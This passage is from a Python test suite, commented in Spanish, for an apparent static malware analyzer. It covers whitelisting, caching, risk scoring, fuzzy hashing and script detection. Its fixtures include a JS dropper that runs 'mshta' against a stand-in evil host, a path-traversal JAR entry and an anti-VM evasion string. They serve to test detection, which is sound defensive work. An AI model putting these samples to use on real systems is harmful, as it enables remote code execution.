        assert result['executed'] is False, "¡El analizador marcó executed=True!"
        assert 'network_indicators' in result
        assert 'persistence_indicators' in result
        print(f"✅ 1b. analyze() nunca ejecuta: executed={result['executed']}")
        print(f"   IOCs detectados sin ejecutar: red={len(result['network_indicators'])}, "
              f"persistencia={len(result['persistence_indicators'])}")
    finally:
        os.unlink(test_file)


# ---------------------------------------------------------------------
# PRIORIDAD 2 (ALTA): whitelist reduce falsos positivos
# ---------------------------------------------------------------------
def test_priority2_whitelist():
    section("PRIORIDAD 2: whitelist de hashes reduce falsos positivos")

    from virus_analyzer import StaticAnalyzer

    tmp_dir = tempfile.mkdtemp()
    try:
        whitelist_path = os.path.join(tmp_dir, 'known_good.txt')
        test_file = os.path.join(tmp_dir, 'legit.bin')
        with open(test_file, 'wb') as f:
            f.write(b"contenido legitimo de prueba")

        sa = StaticAnalyzer(os.path.join(tmp_dir, 'bad.txt'), whitelist_path)
        h = sa.get_file_hashes(test_file)

        result_before = sa.check_whitelist(test_file, hashes=h)
        assert result_before['is_whitelisted'] is False
        print("✅ 2a. Archivo desconocido: NO está en whitelist (correcto)")

        with open(whitelist_path, 'w') as f:
            f.write(h['sha256'] + '\n')
        sa.known_good_hashes.add(h['sha256'])

        result_after = sa.check_whitelist(test_file, hashes=h)
        assert result_after['is_whitelisted'] is True
        assert result_after['method'] == 'hash_db'
        print("✅ 2b. Tras agregar el hash: SÍ está en whitelist, method=hash_db")

        from risk_scoring import calculate_risk_score
        virus_noisy = {
            'reputation': {'sha256_match': False},
            'whitelist': result_after,
            'static_analysis': {'suspicious': ['Sección con entropía alta']},
            'ml_prediction': {'prediction': 'SOSPECHOSO', 'method': 'heuristic', 'score': 2},
        }
        score, level, indicators = calculate_risk_score(virus_noisy)
        assert score <= 15, f"El whitelist debería limitar el score a <=15, fue {score}"
        assert any('WHITELISTED' in i for i in indicators)
        print(f"✅ 2c. Con ruido heurístico + whitelist: score={score} (limitado), nivel={level}")
    finally:
        shutil.rmtree(tmp_dir, ignore_errors=True)


# ---------------------------------------------------------------------
# PRIORIDAD 3 (MEDIA): caché SQLite evita re-análisis
# ---------------------------------------------------------------------
def test_priority3_cache():
    section("PRIORIDAD 3: caché SQLite evita re-analizar")

    from analysis_cache import AnalysisCache

    tmp_dir = tempfile.mkdtemp()
    try:
        db_path = os.path.join(tmp_dir, 'cache.db')
        cache = AnalysisCache(db_path, ttl_days=30)

        fake_hash = 'b' * 64
        assert cache.get(fake_hash) is None
        print("✅ 3a. Cache miss en hash no visto antes")

        cache.set(fake_hash, '/ruta/ejemplo.exe', 'ALTO', {'summary': {'risk_level': 'ALTO'}})
        hit = cache.get(fake_hash)
        assert hit is not None
        assert hit['risk_level'] == 'ALTO'
        print("✅ 3b. Cache hit tras guardar, mismo contenido recuperado")

        import analysis_cache as ac_module
        original_version = ac_module.ENGINE_VERSION
        ac_module.ENGINE_VERSION = original_version + 999
        assert cache.get(fake_hash) is None, "Debería invalidar tras cambiar ENGINE_VERSION"
        ac_module.ENGINE_VERSION = original_version
        print("✅ 3c. Cache se invalida automáticamente si sube ENGINE_VERSION (reglas/modelo actualizados)")
    finally:
        shutil.rmtree(tmp_dir, ignore_errors=True)


# ---------------------------------------------------------------------
# PRIORIDAD 4 (MEDIA): scoring correlacionado, no suma simple
# ---------------------------------------------------------------------
def test_priority4_correlated_scoring():
    section("PRIORIDAD 4: scoring correlacionado (combinaciones peligrosas)")

    from risk_scoring import calculate_risk_score

    v1 = {'reputation': {'sha256_match': True}}
    score1, level1, ind1 = calculate_risk_score(v1)
    assert score1 == 100 and level1 == 'CRÍTICO'
    print(f"✅ 4a. Hash malicioso conocido: score={score1} (certeza absoluta, sin diluir)")

    v2 = {'reputation': {'sha256_match': False}}
    s2 = {'network': {'count': 2}, 'persistence': {'count': 1}, 'obfuscation': {'count': 0}}
    score2, level2, ind2 = calculate_risk_score(v2, s2)
    assert any('COMBO' in i for i in ind2), "Debería detectar la combinación red+persistencia"
    print(f"✅ 4b. Combo red+persistencia detectado: score={score2}, indicadores={ind2}")

    v3 = {'reputation': {'sha256_match': False}}
    s3 = {'network': {'count': 1}, 'persistence': {'count': 0}, 'obfuscation': {'count': 0}}
    score3, level3, ind3 = calculate_risk_score(v3, s3)
    assert not any('COMBO' in i for i in ind3)
    assert score3 < score2, "Una señal aislada debe pesar menos que la combinación"
    print(f"✅ 4c. Señal aislada (sin combo): score={score3} < score con combo ({score2})")
    print("   Confirma que NO es una suma lineal ciega: la correlación importa.")


# ---------------------------------------------------------------------
# PRIORIDAD 5 (BAJA): logging profesional + archivos grandes
# ---------------------------------------------------------------------
def test_priority5_logging_and_large_files():
    section("PRIORIDAD 5: logging con rotación + manejo de archivos grandes")

    import logging
    import logging.handlers
    from app_logging import setup_logging

    tmp_dir = tempfile.mkdtemp()
    try:
        import app_logging
        # FIX #3: guardar handlers originales del logger para restaurarlos al
        # final. Sin esto, el logger global queda apuntando a archivos de
        # tmp_dir que serán borrados → ruido en stderr de tests posteriores.
        root_logger = logging.getLogger('PyThreatAnalyzer')
        original_handlers = list(root_logger.handlers)
        original_configured = app_logging._configured

        app_logging._configured = False
        logger = setup_logging(tmp_dir)

        has_rotating = any(isinstance(h, logging.handlers.RotatingFileHandler) for h in logger.handlers)
        assert has_rotating, "Debe usar RotatingFileHandler, no FileHandler plano"
        print("✅ 5a. Logging usa RotatingFileHandler (no crece sin límite)")

        logger.warning("Prueba de log de detección")
        assert os.path.exists(os.path.join(tmp_dir, 'detections.log'))
        assert os.path.exists(os.path.join(tmp_dir, 'pythreatanalyzer.log'))
        print("✅ 5b. Se generan pythreatanalyzer.log y detections.log correctamente")

        from virus_analyzer import StaticAnalyzer, LARGE_FILE_THRESHOLD

        big_file = os.path.join(tmp_dir, 'big.bin')
        with open(big_file, 'wb') as f:
            chunk = os.urandom(1024 * 1024)
            written = 0
            target = LARGE_FILE_THRESHOLD + (2 * 1024 * 1024)
            while written < target:
                f.write(chunk)
                written += len(chunk)

        sa = StaticAnalyzer(os.path.join(tmp_dir, 'bad.txt'), os.path.join(tmp_dir, 'good.txt'))
        entropy, was_sampled = sa.calculate_file_entropy(big_file)
        assert was_sampled is True, "Un archivo > LARGE_FILE_THRESHOLD debe muestrearse"
        assert 0 <= entropy <= 8
        print(f"✅ 5c. Archivo de {target // (1024*1024)}MB: entropía calculada por MUESTREO "
              f"(sampled={was_sampled}), sin cargarlo completo en memoria")

        strings_result = sa.extract_strings(big_file)
        assert strings_result['sampled'] is True
        print("✅ 5d. extract_strings() también muestrea en archivos grandes")
    finally:
        # FIX #3: restaurar handlers originales antes de borrar tmp_dir.
        try:
            current = logging.getLogger('PyThreatAnalyzer')
            for h in list(current.handlers):
                try:
                    h.close()
                except Exception:
                    pass
                current.removeHandler(h)
            for h in original_handlers:
                current.addHandler(h)
            app_logging._configured = original_configured
        except Exception:
            pass
        shutil.rmtree(tmp_dir, ignore_errors=True)


# ---------------------------------------------------------------------
# PRIORIDAD 6: sin falsos positivos en video/audio/zip/imagen legítimos,
# SIN perder detección real en ejecutables (caso reportado: .mp4/.zip
# personales marcados SOSPECHOSO solo por entropía alta; y regresión
# encontrada al revisar una corrección propuesta: un límite de palabra
# demasiado estricto rompía la detección de "VMwareService.exe" real).
# ---------------------------------------------------------------------
def test_priority6_no_false_positives_on_media_files():
    section("PRIORIDAD 6: sin falsos positivos en multimedia, sin perder detección real")

    import os
    from ml_detector import MLDetector
    from dynamic_analyzer import DynamicAnalyzer
    from risk_scoring import calculate_risk_score
    from analysis_utils import is_high_entropy_expected

    tmp_dir = tempfile.mkdtemp()
    try:
        # --- Video personal legítimo: no debe marcarse sospechoso ---
        video_path = os.path.join(tmp_dir, 'video_personal.mp4')
        with open(video_path, 'wb') as f:
            f.write(os.urandom(60 * 1024 * 1024))
        with open(video_path, 'r+b') as f:
            f.seek(1000)
            f.write(b'http://www.videolan.org/x264.html')

        assert is_high_entropy_expected(video_path) is True
        print("✅ 6a. .mp4 reconocido como contenedor de alta entropía esperada")

        det = MLDetector()
        ml_result = det.predict(video_path)
        assert ml_result['prediction'] == 'BENIGNO', \
            f"Un .mp4 con entropía alta NO debe marcarse SOSPECHOSO, fue {ml_result['prediction']}"
        print("✅ 6b. ML heurístico ya NO marca SOSPECHOSO un video solo por entropía alta")

        # --- La misma entropía en un .exe SÍ debe seguir siendo señal válida ---
        exe_path = os.path.join(tmp_dir, 'sample.exe')
        with open(exe_path, 'wb') as f:
            f.write(os.urandom(2 * 1024 * 1024))
        ml_result_exe = det.predict(exe_path)
        assert ml_result_exe['prediction'] == 'SOSPECHOSO', \
            "Un .exe con la misma entropía SÍ debe seguir marcándose (no se perdió detección real)"
        print("✅ 6c. Un .exe con la misma entropía SIGUE marcándose (detección real intacta)")

        da = DynamicAnalyzer()
        behavior = da.analyze(video_path)
        assert behavior['low_confidence_container'] is True
        print("✅ 6d. behavior_analysis marca el contenedor como de baja confianza")

        virus_results = {
            'file': video_path,
            'reputation': {'md5_match': False, 'sha256_match': False},
            'whitelist': {'is_whitelisted': False},
            'static_analysis': {'note': 'n/a'},
            'strings': {'urls': ['http://www.videolan.org/x264.html'], 'ips': [], 'suspicious_commands': []},
            'polyglot': [],
            'behavior_analysis': behavior,
            'yara': {'matches': []},
            'ml_prediction': ml_result,
        }
        score, level, indicators = calculate_risk_score(virus_results)
        assert level in ('SIN RIESGO DETECTADO', 'BAJO'), \
            f"Video personal legítimo no debería superar BAJO, dio {level} (score={score})"
        print(f"✅ 6e. Score final para video personal legítimo: {score} ({level}) — sin falso positivo")

        # --- Regresión encontrada durante revisión: un .exe con un nombre de
        # proceso anti-VM real PEGADO sin separador ("VMwareService.exe")
        # debe seguir detectándose. Un límite de palabra en ambos lados
        # (\bvmware\b) rompía esto porque nunca hay separador tras "vmware"
        # en "VMwareService". Se usa lookbehind negativo (solo exige límite
        # ANTES del indicador, no después).
        evasive_exe = os.path.join(tmp_dir, 'evasive.exe')
        with open(evasive_exe, 'wb') as f:
            f.write(b'MZ' + os.urandom(200))
            f.write(b'VMwareService.exe detected, exiting')
            f.write(os.urandom(200))
        behavior_exe = da.analyze(evasive_exe)
        assert len(behavior_exe['anti_analysis_indicators']) > 0, \
            "Regresión: se perdió la detección de 'VMwareService.exe' (patrón anti-VM real pegado sin separador)"
        print("✅ 6f. 'VMwareService.exe' (patrón anti-VM real concatenado) SIGUE detectándose")
    finally:
        shutil.rmtree(tmp_dir, ignore_errors=True)


# ---------------------------------------------------------------------
# ÁREA 7: importador fuzzy (import_fuzzy_hashes.py) end-to-end.
# Puebla bases TLSH/ssdeep con muestras sintéticas y verifica que
# check_reputation() las use: match exacto, fuzzy y cero falsos positivos.
# ---------------------------------------------------------------------
def test_area7_fuzzy_importer():
    section("ÁREA 7: importador fuzzy (TLSH/ssdeep) + check_reputation()")
    import random
    import import_fuzzy_hashes as imp
    from virus_analyzer import StaticAnalyzer, _TLSH_AVAILABLE, _SSDEEP_AVAILABLE

    if not (_TLSH_AVAILABLE or _SSDEEP_AVAILABLE):
        _skip_test("sin dependencias fuzzy (instalar python-tlsh o ssdeep)")
    if not os.path.exists(os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                       'import_fuzzy_hashes.py')):
        _skip_test("falta import_fuzzy_hashes.py")

    exp_tlsh = 1 if _TLSH_AVAILABLE else 0
    exp_ssdeep = 1 if _SSDEEP_AVAILABLE else 0

    def count_entries(path):
        with open(path, 'r', encoding='utf-8') as f:
            return sum(1 for l in f if l.strip() and not l.strip().startswith('#'))

    tmp_dir = tempfile.mkdtemp()
    try:
        samples = os.path.join(tmp_dir, 'samples')
        probes = os.path.join(tmp_dir, 'probes')
        os.makedirs(samples)
        os.makedirs(probes)
        tlsh_db = os.path.join(tmp_dir, 'malware_tlsh.txt')
        ssdeep_db = os.path.join(tmp_dir, 'malware_ssdeep.txt')

        # --- Muestras sintéticas ---
        base_data = os.urandom(1024 * 1024)                       # 1 MB
        sample1 = os.path.join(samples, 'sample1.bin')
        with open(sample1, 'wb') as f:
            f.write(base_data)
        with open(os.path.join(samples, 'sample1_copy.bin'), 'wb') as f:
            f.write(base_data)                                    # duplicado: dedupe SHA256
        with open(os.path.join(samples, 'tiny.bin'), 'wb') as f:
            f.write(os.urandom(100))                              # < 256B: se salta

        near_dup = os.path.join(probes, 'near_dup.bin')           # near-dup: 4 bytes alterados
        barr = bytearray(base_data)
        rng = random.Random(1234)
        for _ in range(4):
            barr[rng.randrange(len(barr))] = rng.randrange(256)
        with open(near_dup, 'wb') as f:
            f.write(bytes(barr))
        unrelated = os.path.join(probes, 'unrelated.bin')
        with open(unrelated, 'wb') as f:
            f.write(os.urandom(1024 * 1024))
        probe_exact = os.path.join(probes, 'probe_exact.bin')
        with open(probe_exact, 'wb') as f:
            f.write(base_data)

        def run_importer(argv):
            imp.IMPORTER_STATE.clear()  # fuerza recarga por ruta desde disco
            rc = imp._importer_main(argv)
            assert rc == 0, f"importer retornó {rc} con argv={argv}"

        # --- T1: import inicial (merge, dedupe, min-size) ---
        run_importer([samples, '--tlsh-db', tlsh_db, '--ssdeep-db', ssdeep_db])
        if _TLSH_AVAILABLE:
            assert count_entries(tlsh_db) == exp_tlsh, \
                f"T1: TLSH esperaba {exp_tlsh} entrada(s), hay {count_entries(tlsh_db)}"
        if _SSDEEP_AVAILABLE:
            assert count_entries(ssdeep_db) == exp_ssdeep, \
                f"T1: ssdeep esperaba {exp_ssdeep} entrada(s), hay {count_entries(ssdeep_db)}"
        print("✅ 7a. Import inicial: dedupe SHA256 + salto de <256B correctos")

        # --- T2: re-import idempotente ---
        run_importer([samples, '--tlsh-db', tlsh_db, '--ssdeep-db', ssdeep_db])
        if _TLSH_AVAILABLE:
            assert count_entries(tlsh_db) == exp_tlsh, "T2: el re-import duplicó entradas TLSH"
        print("✅ 7b. Re-import idempotente (no duplica)")

        # --- T3: check_reputation() consume las bases ---
        sa = StaticAnalyzer(os.path.join(tmp_dir, 'bad.txt'),
                            os.path.join(tmp_dir, 'good.txt'),
                            os.path.join(tmp_dir, 'imp.txt'),
                            None,
                            tlsh_db if _TLSH_AVAILABLE else os.path.join(tmp_dir, 'no_tlsh.txt'),
                            ssdeep_db if _SSDEEP_AVAILABLE else os.path.join(tmp_dir, 'no_ssdeep.txt'))

        # 3c: copia idéntica -> match EXACTO
        rep = sa.check_reputation(probe_exact)
        assert rep.get('tlsh_match') or rep.get('ssdeep_match'), \
            (f"T3c: copia idéntica no matcheó (tlsh_match={rep.get('tlsh_match')}, "
             f"ssdeep_match={rep.get('ssdeep_match')})")
        print("✅ 7c. Copia idéntica → match exacto en check_reputation()")

        # 3d: FIX BUG A - caso original preservado por ambos lados
        if _TLSH_AVAILABLE and rep.get('tlsh'):
            assert rep['tlsh'] in sa.known_bad_tlsh, \
                "T3d: el probe TLSH no está en refs tal cual (¿se lowercaseó?)"
        if _SSDEEP_AVAILABLE and rep.get('ssdeep'):
            assert rep['ssdeep'] in sa.known_bad_ssdeep, \
                "T3d: el probe ssdeep no está en refs tal cual (¿se lowercaseó?)"
        print("✅ 7d. FIX BUG A: refs y probes en CASO ORIGINAL (sin lowercase)")

        # 3e: near-dup -> match FUZZY
        rep_near = sa.check_reputation(near_dup)
        assert rep_near.get('tlsh_match') or rep_near.get('ssdeep_match'), \
            (f"T3e: near-dup no disparó fuzzy (tlsh_match={rep_near.get('tlsh_match')}, "
             f"ssdeep_match={rep_near.get('ssdeep_match')})")
        print("✅ 7e. Near-duplicate (4 bytes alterados) → match FUZZY")

        # 3f: no relacionado -> SIN falso positivo
        rep_unrel = sa.check_reputation(unrelated)
        assert not rep_unrel.get('tlsh_match') and not rep_unrel.get('ssdeep_match'), \
            "T3f: falso positivo del fuzzy con archivo no relacionado"
        print("✅ 7f. Archivo no relacionado → sin falso positivo")

        # --- T4: --replace regenera desde cero (regresión set() vs {}) ---
        run_importer([samples, '--replace', '--tlsh-db', tlsh_db, '--ssdeep-db', ssdeep_db])
        if _TLSH_AVAILABLE:
            assert count_entries(tlsh_db) == exp_tlsh, \
                "T4: --replace no regeneró TLSH (¿bug set() vs {}?)"
        print("✅ 7g. --replace regenera desde cero")

        # --- T5: coexistencia tras re-merge ---
        run_importer([samples, '--tlsh-db', tlsh_db, '--ssdeep-db', ssdeep_db])
        if _TLSH_AVAILABLE:
            assert count_entries(tlsh_db) == exp_tlsh, "T5: las entradas TLSH no coexisten"
        print("✅ 7h. Coexistencia tras re-merge")
    finally:
        shutil.rmtree(tmp_dir, ignore_errors=True)


def test_cooperative_cancel_and_json_log_format():
    import json
    import logging
    import zipfile
    from archive_analyzer import analyze_compressed_file
    from app_logging import JsonLineFormatter

    class CancelRequested(Exception):
        _pythreat_cancelled = True

    with tempfile.TemporaryDirectory() as tmp:
        archive_path = os.path.join(tmp, 'cancel.zip')
        with zipfile.ZipFile(archive_path, 'w') as archive:
            archive.writestr('member.txt', 'test')

        def cancel_member(_path):
            raise CancelRequested()

        try:
            analyze_compressed_file(archive_path, member_analyzer=cancel_member)
        except CancelRequested:
            pass
        else:
            raise AssertionError('La cancelación fue absorbida por el análisis del contenedor')

    record = logging.LogRecord('test', logging.WARNING, __file__, 1, 'línea %s', ('segura',), None)
    parsed = json.loads(JsonLineFormatter().format(record))
    assert parsed['message'] == 'línea segura'
    assert parsed['level'] == 'WARNING'


# ---------------------------------------------------------------------
# VERIFICACIÓN externa (secciones 2.1-2.3 y 3.1-3.2 del informe): casos
# que el evaluador detectó como regresiones/carencias puntuales.
# ---------------------------------------------------------------------
def test_verification_31_structured_traversal_propagation():
    section("VERIF §3.1: JAR path traversal propaga suspicious_patterns + warnings")
    import zipfile
    from archive_analyzer import analyze_structured_zip
    from analysis_utils import collect_analysis_warnings

    with tempfile.TemporaryDirectory() as tmp:
        jar = os.path.join(tmp, 'evil.jar')
        with zipfile.ZipFile(jar, 'w') as zf:
            zf.writestr('META-INF/MANIFEST.MF', 'Manifest-Version: 1.0\n')
            zf.writestr('legit/App.class', b'\xca\xfe\xba\xbe')
            zf.writestr('../../evil.exe', 'MZ payload')

        res = analyze_structured_zip(
            jar, member_analyzer=lambda p: {'risk_level': 'BENIGNO'})
        assert res.get('format') == 'JAR'
        # N-08 residual: traversal debe subir el nivel, no quedarse en BENIGNO.
        assert res.get('risk_level') == 'SOSPECHOSO', res.get('risk_level')
        assert any('Ruta insegura en ZIP' in p
                   for p in res.get('suspicious_patterns', [])), (
            "3.1: el path traversal detectado por _analyze_zip debe "
            "propagarse a suspicious_patterns del contenedor estructurado")
        warnings = collect_analysis_warnings(archive_results=res)
        assert any('Ruta insegura' in w for w in warnings), (
            "2.2: la advertencia debe llegar a analysis_warnings")

        # N-08 residual: el nivel debe traducirse en score (ANTES era 0).
        from risk_scoring import calculate_risk_score
        score, level, ind = calculate_risk_score(
            {'archive_analysis': res,
             'reputation': {'sha256_match': False, 'md5_match': False},
             'whitelist': {'is_whitelisted': False}})
        assert level == 'MEDIO' and score >= 25 and 'ARCHIVE_SOSPECHOSO' in ind, \
            (score, level, ind)
        print("✅ §5a. JAR con ../../evil.exe: SOSPECHOSO + warnings + score MEDIO")


def test_verification_22_container_and_truncation_warnings():
    section("VERIF §2.2: contenedor corrupto / flags truncados entran en warnings")
    from archive_analyzer import analyze_compressed_file
    from analysis_utils import collect_analysis_warnings

    with tempfile.TemporaryDirectory() as tmp:
        corrupt = os.path.join(tmp, 'corrupt.zip')
        with open(corrupt, 'wb') as f:
            f.write(b'PK\x03\x04\x00\x00\x00\x00\x00\x00')
        res = analyze_compressed_file(corrupt, member_analyzer=None)
        assert any('CONTENEDOR_CORRUPTO' in p
                   for p in res.get('suspicious_patterns', [])), \
            res.get('suspicious_patterns')
        warns = collect_analysis_warnings(archive_results=res)
        assert any('corrupto' in w.lower() or 'incompleto' in w.lower()
                   for w in warns), warns

        # Flags de truncamiento/muestreo (estático, comportamiento, entropía)
        warns2 = collect_analysis_warnings(
            document_results={'truncated': True},
            static_analysis={'truncated': True},
            behavior_analysis={'truncated': True, 'sampled': True},
            entropy_windows={'sampled': True})
        assert any('truncado' in w for w in warns2), warns2
        assert any('muestreo' in w for w in warns2), warns2
        print("✅ §5b. ZIP corrupto → warning; truncation/sampled reportados")


def test_verification_21_web_script_detection():
    section("VERIF §2.1: JS/VBS (ActiveXObject) detectados; .js limpio y .py no")
    from script_analyzer import ScriptAnalyzer
    from risk_scoring import calculate_risk_score

    base = {'reputation': {'sha256_match': False, 'md5_match': False},
            'whitelist': {'is_whitelisted': False}}

    with tempfile.TemporaryDirectory() as tmp:
        js = os.path.join(tmp, 'drop.js')
        with open(js, 'w', encoding='utf-8') as f:
            f.write('var f = new Function("return 1");\n'
                    'var s = new ActiveXObject("WScript.Shell");\n'
                    'try { s.RegRead("HKCU\\\\software\\\\x"); } catch (e) {}\n'
                    's.Run("mshta http://evil.example/x");\n')
        res = ScriptAnalyzer().analyze_script(js)
        web = res.get('web_script_analysis') or {}
        assert len(web.get('suspicious', [])) >= 4, web
        score, level, indicators = calculate_risk_score(base, res)
        assert 'WEB_SCRIPT_SUSPICIOUS' in indicators, indicators
        assert score >= 25, score
        assert level == 'MEDIO', level
        print(f"✅ §5c. JS dropper: {len(web['suspicious'])} marcadores → {level} {score}")

        # N-03 residual: '.exec('/' .run(' NO deben disparar (FP en JS legit).
        legit_js = os.path.join(tmp, 'legit.js')
        with open(legit_js, 'w', encoding='utf-8') as f:
            f.write('function firstMatch(re, s) { return re.exec(s); }\n'
                    'function runner(x) { return x.run ? x.run() : null; }\n')
        res_fp = ScriptAnalyzer().analyze_script(legit_js)
        assert not (res_fp.get('web_script_analysis') or {}).get('suspicious'), \
            res_fp.get('web_script_analysis')
        _, _, ind_fp = calculate_risk_score(base, res_fp)
        assert 'WEB_SCRIPT_SUSPICIOUS' not in ind_fp, ind_fp
        print("✅ §5c. N-03: re.exec()/x.run() en JS legítimo ya NO disparan WEB_SCRIPT")

        clean = os.path.join(tmp, 'clean.js')
        with open(clean, 'w', encoding='utf-8') as f:
            f.write('console.log("hello world");\n')
        res2 = ScriptAnalyzer().analyze_script(clean)
        assert not (res2.get('web_script_analysis') or {}).get('suspicious'), res2
        _, _, ind2 = calculate_risk_score(base, res2)
        assert 'WEB_SCRIPT_SUSPICIOUS' not in ind2, ind2

        py = os.path.join(tmp, 'tool.py')
        with open(py, 'w', encoding='utf-8') as f:
            f.write('import os\nprint(os.getcwd())\n')
        res3 = ScriptAnalyzer().analyze_script(py)
        assert not res3.get('web_script_analysis'), \
            "Python no debe generar web_script_analysis"
        print("✅ §5c. .js limpio y .py no disparan WEB_SCRIPT_SUSPICIOUS")


def test_verification_32_cache_hit_uses_scanned_path():
    section("VERIF §3.2: cache hit en GUI devuelve la ruta realmente escaneada")
    import threading
    import types
    _require_tkinter()
    import main as gui_mod
    from analysis_cache import AnalysisCache
    from virus_analyzer import StaticAnalyzer

    with tempfile.TemporaryDirectory() as tmp:
        whitelist = os.path.join(tmp, 'known_good_hashes.txt')
        with open(whitelist, 'w', encoding='utf-8') as f:
            f.write('')
        analyzer = StaticAnalyzer(
            hash_db_path=os.path.join(tmp, 'malware_hashes.txt'),
            whitelist_db_path=whitelist)
        cache = AnalysisCache(os.path.join(tmp, 'cache.db'),
                              ttl_days=30, trust_decay_days=90)

        gui = object.__new__(gui_mod.PyThreatAnalyzerGUI)
        gui.cache = cache
        gui.static_analyzer = analyzer
        gui.force_rescan_var = types.SimpleNamespace(get=lambda: False)
        gui._whitelist_lock = threading.RLock()

        orig = os.path.join(tmp, 'orig.exe')
        copy = os.path.join(tmp, 'copy.exe')
        payload = b'MZ same byte content identical hash'
        with open(orig, 'wb') as f:
            f.write(payload)
        with open(copy, 'wb') as f:
            f.write(payload)

        hashes = analyzer.get_file_hashes(orig)
        h = hashes['sha256']
        cached_report = dict(file=orig, risk_level='BAJO',
                             hashes=hashes,
                             _cache_schema=gui_mod.GUI_CACHE_SCHEMA)
        cache.set(h, orig, 'BAJO', cached_report)

        result, from_cache = gui._analyze_virus_cached(copy)
        assert from_cache is True
        assert result is not cached_report, \
            "Debe devolver una copia, no mutar la entrada de la caché"
        assert result['file'] == copy, \
            f"3.2: el reporte cacheado apuntaba a la ruta original ({result['file']})"
        assert result.get('_cached') is True
        assert result['_cache_schema'] == gui_mod.GUI_CACHE_SCHEMA
        print("✅ §5d. Cache hit con 2 rutas: reporte apunta a la ruta escaneada (_cached=True)")


def test_verification_23_trust_decay_cli_shared_helper():
    section("VERIF §2.3: trust decay compartido CLI/GUI retira el hash de whitelist")
    import time
    import threading
    from analysis_cache import AnalysisCache, expire_whitelist_hash_if_needed
    from virus_analyzer import StaticAnalyzer

    with tempfile.TemporaryDirectory() as tmp:
        wl = os.path.join(tmp, 'known_good_hashes.txt')
        h = 'a' * 64
        with open(wl, 'w', encoding='utf-8') as f:
            f.write(h + '\n')
        with open(os.path.join(tmp, 'malware_hashes.txt'), 'w', encoding='utf-8') as f:
            f.write('')

        analyzer = StaticAnalyzer(
            hash_db_path=os.path.join(tmp, 'malware_hashes.txt'),
            whitelist_db_path=wl)
        assert h in analyzer.known_good_hashes

        cache = AnalysisCache(os.path.join(tmp, 'cache.db'),
                              ttl_days=30, trust_decay_days=90)
        cache.set_whitelist_with_expiry(h, expiry_days=0)
        time.sleep(1.1)
        assert cache.is_whitelist_expired(h) is True

        removed = expire_whitelist_hash_if_needed(
            cache, analyzer, h, lock=threading.RLock())
        assert removed is True
        assert h not in analyzer.known_good_hashes, \
            "Debe retirarse de known_good_hashes en memoria"
        with open(wl, 'r', encoding='utf-8') as f:
            assert h not in f.read(), \
                "Debe retirarse de known_good_hashes.txt en disco"
        assert cache.is_whitelist_expired(h) is False, \
            "Debe limpiarse la fecha de expiración"

        assert expire_whitelist_hash_if_needed(cache, analyzer, h) is False
        print("✅ §5e. Trust decay retira hash de memoria+disco+expiry (CLI y GUI)")


def test_verification_19_similarity_not_packer():
    section("VERIF §N-19: similitud fuzzy no usa T1027.002 (Software Packing)")
    from explanation_engine import ExplanationEngine

    ex = ExplanationEngine()
    exp = ex.add_similarity_explanation('TLSH', 'muestra similar')
    assert exp.mitre_technique is None, \
        f"La similitud fuzzy no debe usar MITRE, fue: {exp.mitre_technique}"
    assert 'Fuzzy_TLSH' == exp.indicator

    # El empaquetador real (datos incompressibles) SÍ sigue en T1027.002
    p = ex.add_packer_explanation('datos_no_compressibles', 'muestra')
    assert 'T1027.002' in str(p.mitre_technique), p.mitre_technique
    print("✅ §N-19. fuzzy → sin MITRE; packing → T1027.002")


def test_verification_33_engine_shared_pipeline():
    section("VERIF §N-17: el motor único produce el pipeline completo")
    from analysis_engine import AnalysisEngine
    from virus_analyzer import StaticAnalyzer
    from yara_engine import YARAEngine
    from document_analyzer import DocumentAnalyzer
    from dynamic_analyzer import DynamicAnalyzer
    from ml_detector import MLDetector
    from script_analyzer import ScriptAnalyzer
    from ai_detector import AIDetector

    tmp = tempfile.mkdtemp()
    try:
        analyzer = StaticAnalyzer(
            hash_db_path=os.path.join(tmp, 'm.txt'),
            whitelist_db_path=os.path.join(tmp, 'g.txt'))
        engine = AnalysisEngine(
            analyzer, YARAEngine(os.path.join(tmp, 'rules')),
            DocumentAnalyzer(), DynamicAnalyzer(), MLDetector(None),
            ScriptAnalyzer(), AIDetector())

        sample = os.path.join(tmp, 'sample.js')
        with open(sample, 'w', encoding='utf-8') as f:
            f.write('var s = "WScript.Shell"; eval(atob("cHJpbnQ="));\n')
        r = engine.analyze_file(sample)
        for key in ('file', 'hashes', 'risk_score', 'risk_level', 'indicators',
                    'layer_scores', 'explanation', 'file_type',
                    'file_type_is_executable', 'analysis_status',
                    'analysis_warnings', 'script_results', 'ai_results'):
            assert key in r, f"El motor no expone '{key}'"
        assert isinstance(r['layer_scores'], dict) and r['layer_scores'], \
            "El motor debe calcular capas (calculate_layered_risk)"
        assert r['explanation'] and r['explanation'].get('summary'), \
            "El motor debe generar el resumen explainable"
        assert r['script_results'], "Un .js debe analizarse como script dentro del motor"
        assert r['analysis_status'] in ('COMPLETE', 'INCOMPLETE')

        # El miembro de contenedor usa el mismo pipeline y devuelve riesgo.
        clean = os.path.join(tmp, 'note.txt')
        with open(clean, 'w', encoding='utf-8') as f:
            f.write('hola mundo\n')
        member = engine.scan_member(clean)
        assert 'error' not in member, f"scan_member no debe fallar en un texto: {member}"
        assert member.get('risk_score') is not None
        assert r['file'] == sample
        print("✅ §N-17a. AnalysisEngine expone pipeline+capas+script/IA y scan_member")
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


def test_verification_34_cli_gui_delegate_to_engine():
    section("VERIF §N-17: CLI y GUI delegan en el MISMO motor")
    _require_tkinter()
    import main as gui_mod
    import cli as cli_mod
    from virus_analyzer import StaticAnalyzer

    class _StubEngine:
        def __init__(self, payload):
            self.payload = payload
            self.calls = []
            self.on_checkpoint = None

        def analyze_file(self, file_path, hashes=None):
            self.calls.append((file_path, hashes))
            return dict(self.payload)

        def scan_member(self, file_path):
            return self.analyze_file(file_path)

    payload = {
        'file': 'x', 'file_type': 'JAVASCRIPT', 'hashes': {'sha256': 'a' * 64},
        'imphash': None, 'risk_score': 25, 'risk_level': 'MEDIO',
        'indicators': ['X'], 'layer_scores': {'static': {'score': 25}},
        'explanation': 'resumen', 'analysis_status': 'COMPLETE',
        'analysis_warnings': [],
        'whitelist': {'is_whitelisted': True, 'reason': 'lista blanca'},
        'archive_analysis': None,
    }

    gui = object.__new__(gui_mod.PyThreatAnalyzerGUI)
    gui_stub = _StubEngine(payload)
    gui.engine = gui_stub
    gui_out = gui._analyze_virus('/tmp/whatever.js')
    assert gui_out is gui_stub.payload or gui_out['risk_score'] == 25
